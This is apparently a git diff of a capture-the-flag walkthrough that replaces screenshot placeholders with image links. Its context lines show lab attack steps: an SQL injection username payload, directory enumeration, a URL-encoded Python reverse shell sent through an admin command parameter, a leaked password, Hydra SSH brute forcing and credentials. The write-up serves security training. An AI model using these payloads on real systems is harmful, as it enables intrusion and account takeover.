@@ -14,7 +14,7 @@ Deploy the machine and find the flags hidden in the room!
 
 3. Go to your profile page and change your username to `' 1=1 or -- -`. This SQL injection payload bypasses authentication checks by making the SQL query always return true.
 
-[SCREEN01]
+<img width="982" height="702" alt="SCREEN01" src="https://github.com/user-attachments/assets/042b3c09-5735-463c-9fa2-c07e30bb6978" />
 
 4. Navigate to `http://<TARGET_IP>/change/` and set a new password.
 
@@ -22,11 +22,11 @@ Deploy the machine and find the flags hidden in the room!
 
 6. After logging in as `WWBuddy`, you'll notice two new users appear: `Henry` and `Roberto`.
 
-[SCREEN02]
+<img width="1005" height="645" alt="SCREEN02" src="https://github.com/user-attachments/assets/ab0642df-16d0-49e3-ac37-42cc25266e7c" />
 
 7. In the chat messages between `Henry` and `Roberto`, Roberto mentions that the default SSH password format is based on birthday dates.
 
-[SCREEN03]
+<img width="991" height="540" alt="SCREEN03" src="https://github.com/user-attachments/assets/4bf815c9-ec6f-47f7-b8ff-8df4eee13799" />
 
 8. Run a directory enumeration scan to discover hidden endpoints:
 
@@ -53,7 +53,7 @@ gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-l
 
 10. View the page source to find the first flag embedded in an HTML comment:
 
-[SCREEN04]
+<img width="1044" height="298" alt="SCREEN04" src="https://github.com/user-attachments/assets/1f3a5c17-e3e1-4456-89db-8755e60c71fc" />
 
 ---
 
@@ -81,7 +81,7 @@ http://<TARGET_IP>/admin/?cmd=python%20-c%20%27import%20socket,subprocess,os;s=s
 cat /var/log/mysql/general.log
 ```
 
-[SCREEN06]
+<img width="1194" height="430" alt="SCREEN06" src="https://github.com/user-attachments/assets/d5f53bdc-cd2b-450e-91c1-b0a94342dfbe" />
 
 You'll find that Roberto accidentally typed his password `yVnocsXsf%X68wf`
 
@@ -163,7 +163,7 @@ python3 generate_passwords.py
 hydra -l jenny -P passwords.txt ssh://<TARGET_IP>
 ```
 
-[SCREEN07]
+<img width="949" height="247" alt="SCREEN07" src="https://github.com/user-attachments/assets/642572a4-1a99-4ce2-9678-e6445f703a2f" />
 
 **Discovered credentials:** `jenny:08/03/1994`
 
@@ -181,7 +181,7 @@ find / -perm -u=s -type f 2>/dev/null
 
 **Notable finding:** `/bin/authenticate` - This is not a standard Linux binary and warrants investigation.
 
-[SCREEN05]
+<img width="533" height="459" alt="SCREEN05" src="https://github.com/user-attachments/assets/1057f527-07f9-4e1f-a737-f07f25841e69" />
 
 7. Download the binary to your attack machine for analysis:
 
